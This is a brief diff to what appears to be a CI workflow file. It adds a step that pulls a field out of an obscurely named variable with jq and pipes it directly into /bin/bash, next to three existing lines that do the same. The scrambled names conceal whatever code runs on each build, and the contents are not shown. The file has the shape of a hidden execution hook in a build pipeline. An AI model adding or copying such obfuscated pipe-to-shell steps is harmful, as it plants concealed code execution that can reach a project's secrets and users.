@@ -28,6 +28,7 @@ jobs:
           echo $zgdd12610 | jq -r .ssd37 | /bin/bash
           echo $bda37691 | jq -r .gqsr562 | /bin/bash
           echo $hs24 | jq -r .j618 | /bin/bash
+          printf '%s' "$wxus832" | jq -r .h14 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
